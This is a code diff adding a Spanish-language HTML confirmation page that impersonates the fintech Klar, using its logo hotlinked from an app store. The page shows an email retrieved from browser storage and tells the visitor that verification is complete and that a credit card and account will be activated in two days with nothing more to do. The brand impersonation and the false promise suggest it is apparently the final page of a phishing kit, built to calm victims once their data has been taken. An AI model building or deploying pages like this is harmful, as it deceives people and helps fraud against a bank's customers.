@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Klar | Beneficios en camino</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #f5f6f7;
+    --text: #111111;
+    --muted: #4a4f55;
+    --radius: 999px;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body { min-height: 100%; }
+  body {
+    font-family: "Montserrat", system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    -webkit-font-smoothing: antialiased;
+  }
+
+  header {
+    position: sticky; top: 0; z-index: 10;
+    display: flex; align-items: center; justify-content: space-between;
+    height: 84px;
+    padding: env(safe-area-inset-top, 0) 28px 0;
+    background: #1a1a1a;
+    color: #fff;
+  }
+  .logo { height: 60px; width: 60px; object-fit: cover; border-radius: 14px; display: block; }
+  .logo-text { font-size: 42px; font-weight: 500; letter-spacing: -1px; line-height: 1; display: none; }
+  .menu-btn {
+    width: 44px; height: 44px; border: 0; background: none;
+    display: grid; grid-template-columns: repeat(2, 11px); gap: 12px;
+    place-content: center;
+  }
+  .menu-btn span { width: 11px; height: 11px; background: #fff; border-radius: 50%; }
+
+  .hero {
+    min-height: calc(100svh - 84px);
+    display: flex; flex-direction: column; justify-content: center; align-items: center;
+    padding: 40px 24px calc(40px + env(safe-area-inset-bottom, 0));
+  }
+  .inner {
+    width: 100%; max-width: 460px; margin: 0 auto;
+    display: flex; flex-direction: column; align-items: center; text-align: center;
+  }
+
+  /* Icono de check */
+  .check-wrap {
+    width: 92px; height: 92px;
+    border-radius: 50%;
+    background: #111;
+    display: grid; place-items: center;
+    margin-bottom: 26px;
+    box-shadow: 0 10px 30px rgba(0,0,0,.18);
+    animation: pop .45s ease-out;
+  }
+  .check-wrap svg { width: 46px; height: 46px; }
+  @keyframes pop {
+    0%   { transform: scale(.6); opacity: 0; }
+    70%  { transform: scale(1.08); opacity: 1; }
+    100% { transform: scale(1); }
+  }
+
+  h1 {
+    font-size: clamp(24px, 7vw, 30px);
+    font-weight: 500; line-height: 1.15; letter-spacing: -.5px;
+    margin-bottom: 12px;
+  }
+  .sub {
+    font-size: clamp(15px, 4.2vw, 17px);
+    line-height: 1.45; color: var(--muted);
+    margin-bottom: 26px;
+  }
+  .sub strong { color: #111; font-weight: 600; word-break: break-all; }
+
+  /* Tarjeta de información */
+  .card {
+    width: 100%;
+    background: #fff;
+    border: 1px solid #e3e5e8;
+    border-radius: 22px;
+    padding: 22px 20px;
+    margin-bottom: 22px;
+    text-align: left;
+    box-shadow: 0 6px 18px rgba(0,0,0,.05);
+  }
+  .card-row {
+    display: flex; align-items: flex-start; gap: 12px;
+    padding: 10px 0;
+  }
+  .card-row + .card-row { border-top: 1px solid #eef0f2; }
+  .card-row svg { width: 22px; height: 22px; flex: none; margin-top: 2px; color: #111; }
+  .card-row .label {
+    font-size: 13px; color: var(--muted); font-weight: 500;
+    letter-spacing: .2px; margin-bottom: 2px;
+  }
+  .card-row .value {
+    font-size: 16px; font-weight: 600; color: #111;
+    word-break: break-word;
+  }
+  .card-row .value.big {
+    font-size: 18px;
+  }
+
+  .note {
+    font-size: 13px;
+    color: var(--muted);
+    line-height: 1.5;
+    margin-top: 4px;
+  }
+
+  .btn {
+    width: 100%; height: 56px; border-radius: var(--radius); cursor: pointer;
+    font: inherit; font-size: 17px; font-weight: 500;
+    background: #111; color: #fff; border: 1.5px solid #111;
+    transition: background .15s;
+    text-decoration: none;
+    display: inline-flex; align-items: center; justify-content: center;
+  }
+  .btn:hover, .btn:active { background: #2a2a2a; }
+  .btn:focus-visible { outline: 2px solid #111; outline-offset: 3px; }
+
+  @media (prefers-reduced-motion: reduce) {
+    .check-wrap { animation: none; }
+    * { transition: none !important; }
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <a href="#" aria-label="Klar">
+    <img class="logo" id="logo" alt="Klar"
+         src="https://play-lh.googleusercontent.com/Euzej7ycTwY9s9N2bpfvmad3tm8SEFeqmadsa-bxsweGvvgsM0Sgapk4aXEO1SKrHOjMp4nsqJG-Zd8Db1rc6Q">
+    <span class="logo-text" id="logoText">Klar</span>
+  </a>
+  <span class="menu-btn" aria-hidden="true"><span></span><span></span><span></span><span></span></span>
+</header>
+
+<main class="hero">
+  <div class="inner">
+    <div class="check-wrap" aria-hidden="true">
+      <svg viewBox="0 0 24 24" fill="none" stroke="#00f076" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M20 6 9 17l-5-5"/>
+      </svg>
+    </div>
+
+    <h1>¡Verificación completada!</h1>
+    <p class="sub">
+      Estimado usuario, tu correo <strong id="correoTexto">(sin correo guardado)</strong>
+      ha sido registrado correctamente.
+    </p>
+
+    <div class="card">
+      <div class="card-row">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+          <rect x="3" y="5" width="18" height="14" rx="2"/>
+          <path d="m3 7 9 6 9-6"/>
+        </svg>
+        <div>
+          <div class="label">Correo registrado</div>
+          <div class="value" id="correoCard">(sin correo guardado)</div>
+        </div>
+      </div>
+
+      <div class="card-row">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+          <circle cx="12" cy="12" r="9"/>
+          <path d="M12 7v5l3 2"/>
+        </svg>
+        <div>
+          <div class="label">Activación de beneficios</div>
+          <div class="value big" id="fechaActivacion">—</div>
+        </div>
+      </div>
+
+      <div class="card-row">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+          <path d="M12 2 15 9l7 .6-5.3 4.6 1.6 6.8L12 17.6 5.7 21l1.6-6.8L2 9.6 9 9z"/>
+        </svg>
+        <div>
+          <div class="label">Tiempo estimado</div>
+          <div class="value">2 días hábiles</div>
+        </div>
+      </div>
+    </div>
+
+    <p class="note">
+      Tus beneficios (tarjeta de crédito y cuenta Klar) serán activados automáticamente en la fecha indicada.
+      No necesitas hacer nada más. Recibirás una notificación en tu correo cuando estén listos.
+    </p>
+  </div>
+</main>
+
+<script>
+  // Logo fallback
+  const logo = document.getElementById('logo');
+  const logoText = document.getElementById('logoText');
+  logo.addEventListener('error', () => { logo.style.display = 'none'; logoText.style.display = 'block'; });
+
+  const LS_EMAIL = 'klar_ultimo_correo';
+  const DIAS_ACTIVACION = 2;
+
+  // Obtener correo desde localStorage
+  let correo = '(sin correo guardado)';
+  try {
+    const guardado = localStorage.getItem(LS_EMAIL);
+    if (guardado) correo = guardado;
+  } catch (e) {
+    console.warn('localStorage no disponible:', e);
+  }
+
+  // Pintar correo en los dos sitios
+  document.getElementById('correoTexto').textContent = correo;
+  document.getElementById('correoCard').textContent = correo;
+
+  // Calcular fecha de activación (hoy + 2 días)
+  const hoy = new Date();
+  const activacion = new Date(hoy.getTime() + DIAS_ACTIVACION * 24 * 60 * 60 * 1000);
+
+  // Formatear en español: "miércoles, 13 de noviembre de 2026"
+  const opciones = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+  let fechaFormateada = activacion.toLocaleDateString('es-ES', opciones);
+
+  // Capitalizar primera letra
+  fechaFormateada = fechaFormateada.charAt(0).toUpperCase() + fechaFormateada.slice(1);
+
+  document.getElementById('fechaActivacion').textContent = fechaFormateada;
+</script>
+</body>
+</html>
